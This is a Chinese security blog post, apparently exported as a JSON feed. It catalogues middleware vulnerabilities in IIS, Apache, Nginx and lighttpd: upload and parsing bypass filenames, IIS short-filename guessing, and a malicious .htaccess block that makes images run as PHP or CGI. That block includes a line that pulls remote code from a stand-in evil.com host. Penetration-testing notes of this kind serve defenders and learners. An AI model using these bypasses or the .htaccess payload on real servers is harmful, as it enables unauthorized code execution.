{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"apache\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/",
            "title": "中间件",
            "date_published": "2022-11-27T02:59:09.000Z",
            "content_html": "<h1 id=\"iis\"><a class=\"anchor\" href=\"#iis\">#</a> IIS</h1>\n<h2 id=\"iis-60\"><a class=\"anchor\" href=\"#iis-60\">#</a> IIS 6.0</h2>\n<ul>\n<li>\n<p>后缀解析  <code>/xx.asp;.jpg</code></p>\n<ul>\n<li>服务器默认不解析  <code>;</code>  号及其后面的内容，相当于截断。</li>\n</ul>\n</li>\n<li>\n<p>目录解析  <code>/xx.asp/xx.jpg</code>  (xx.asp 目录下任意解析)</p>\n</li>\n<li>\n<p>默认解析  <code>xx.asa</code>   <code>xx.cer</code>   <code>xx.cdx</code></p>\n</li>\n<li>\n<p>PROPFIND 栈溢出漏洞</p>\n</li>\n<li>\n<p>RCE CVE-2017-7269</p>\n</li>\n</ul>\n<h2 id=\"iis-70-75-nginx-0837\"><a class=\"anchor\" href=\"#iis-70-75-nginx-0837\">#</a> IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2>\n<p>在 Fast-CGI 开启状态下，在文件路径后加上  <code>/xx.php</code>  ，即  <code>xx.jpg/xx.php</code>  会被解析为 php 文件。</p>\n<h2 id=\"put漏洞\"><a class=\"anchor\" href=\"#put漏洞\">#</a> PUT 漏洞</h2>\n<ul>\n<li>开启 WebDAV</li>\n<li>拥有来宾用户，且来宾用户拥有上传权限</li>\n<li>可任意文件上传</li>\n</ul>\n<h2 id=\"windows特性\"><a class=\"anchor\" href=\"#windows特性\">#</a> Windows 特性</h2>\n<p>Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用  <code>xx.php[空格]</code>  ，  <code>xx.php.</code> ，  <code>xx.php/</code> ，  <code>xx.php::$DATA</code>  上传脚本文件。</p>\n<h2 id=\"文件名猜解\"><a class=\"anchor\" href=\"#文件名猜解\">#</a> 文件名猜解</h2>\n<p>在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p>\n<ul>\n<li>文件名为原文件名前 6 位字符加上  <code>~1</code>  ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。</li>\n<li>后缀名不超过 3 位，超过部分会被截断</li>\n<li>所有小写字母均转换成大写的字母</li>\n<li>文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</li>\n</ul>\n<p>IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE 六种，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1BU1AtcGQwZnEwMXJnNmE4NDRkLk5FVA==\">需要安装 ASP.NET</span>。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。</p>\n<p>这种方法的局限性在于：</p>\n<ul>\n<li>文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报</li>\n<li>不支持中文文件名</li>\n</ul>\n<p>这种方法可以通过命令  <code>fsutil behavior set disable8dot3 1</code>  关闭 NTFS 8.3 文件格式的支持来修复。</p>\n<h2 id=\"41516-参考链接\"><a class=\"anchor\" href=\"#41516-参考链接\">#</a> 4.15.1.6. 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjMxOA==\">利用 Windows 特性高效猜测目录</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3JvdXNoLnNlY3Byb2plY3QuY29tL2Jsb2cvMjAxOS8wOC91cGxvYWRpbmctd2ViLWNvbmZpZy1mb3ItZnVuLWFuZC1wcm9maXQtMi8=\">Uploading web.config for Fun and Profit 2</span></li>\n</ul>\n<h1 id=\"apache\"><a class=\"anchor\" href=\"#apache\">#</a> Apache</h1>\n<h2 id=\"后缀解析\"><a class=\"anchor\" href=\"#后缀解析\">#</a> 后缀解析</h2>\n<p><code>test.php.x1.x2.x3</code>  （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p>\n<h2 id=\"htaccess\"><a class=\"anchor\" href=\"#htaccess\">#</a> .htaccess</h2>\n<p>当 AllowOverride 被启用时，上传启用解析规则的.htaccess</p>\n<pre><code>AddType application/x-httpd-php .jpg\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();\nOptions ExecCGI\nAddHandler cgi-script .jpg\nOptions +ExecCGI\nAddHandler fcgid-script .gif\nFcgidWrapper &quot;/bin/bash&quot; .gif\nphp_flag allow_url_include 1\nphp_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==\n#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B\n#php_value auto_append_file https://evil.com/evil-code.txt\n</code></pre>\n<h2 id=\"目录遍历\"><a class=\"anchor\" href=\"#目录遍历\">#</a> 目录遍历</h2>\n<p>配置  <code>Options +Indexes</code>  时 Apache 存在目录遍历漏洞。</p>\n<h2 id=\"cve-2017-15715\"><a class=\"anchor\" href=\"#cve-2017-15715\">#</a> CVE-2017-15715</h2>\n<p><code>%0A</code>  绕过上传黑名单。</p>\n<h2 id=\"lighttpd\"><a class=\"anchor\" href=\"#lighttpd\">#</a> lighttpd</h2>\n<pre><code>xx.jpg/xx.php\n</code></pre>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYXBhY2hlLWN2ZS0yMDE3LTE1NzE1LXZ1bG5lcmFiaWxpdHkuaHRtbA==\">Apache 上传绕过</span></li>\n</ul>\n<h1 id=\"nginx\"><a class=\"anchor\" href=\"#nginx\">#</a> Nginx</h1>\n<h2 id=\"fast-cgi关闭\"><a class=\"anchor\" href=\"#fast-cgi关闭\">#</a> Fast-CGI 关闭</h2>\n<p>在 Fast-CGI 关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径 (xx.jpg) 后面加上  <code>%00.php</code>  ， 即  <code>xx.jpg%00.php</code>  会被当做 php 文件来解析</p>\n<h2 id=\"fast-cgi开启\"><a class=\"anchor\" href=\"#fast-cgi开启\">#</a> Fast-CGI 开启</h2>\n<p>在 Fast-CGI 开启状态下，在文件路径后加上  <code>/xx.php</code>  ，则  <code>xx.jpg/xx.php</code>  会被解析为 php 文件</p>\n<h2 id=\"cve-2013-4547\"><a class=\"anchor\" href=\"#cve-2013-4547\">#</a> CVE-2013-4547</h2>\n<pre><code>a.jpg\\x20\\x00.php\n</code></pre>\n<h2 id=\"配置错误\"><a class=\"anchor\" href=\"#配置错误\">#</a> 配置错误</h2>\n<h3 id=\"目录穿越\"><a class=\"anchor\" href=\"#目录穿越\">#</a> 目录穿越</h3>\n<p>如果配置中存在类似  <code>location /foo &#123; alias /bar/; &#125;</code>  的配置时， <code>/foo../</code>  会被解析为  <code>/bar/../</code>  从而导致目录穿越的发生。</p>\n<h3 id=\"目录遍历-2\"><a class=\"anchor\" href=\"#目录遍历-2\">#</a> 目录遍历</h3>\n<p>配置中  <code>autoindex on</code>  开启时，Nginx 中存在目录遍历漏洞。</p>\n<h2 id=\"参考链接-2\"><a class=\"anchor\" href=\"#参考链接-2\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy85MDY0Lmh0bWw=\">CVE-2013-4547 Nginx 解析漏洞深入利用及分析</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "中间件",
                "IIS",
                "Apache",
                "Nginx"
            ]
        }
    ]
}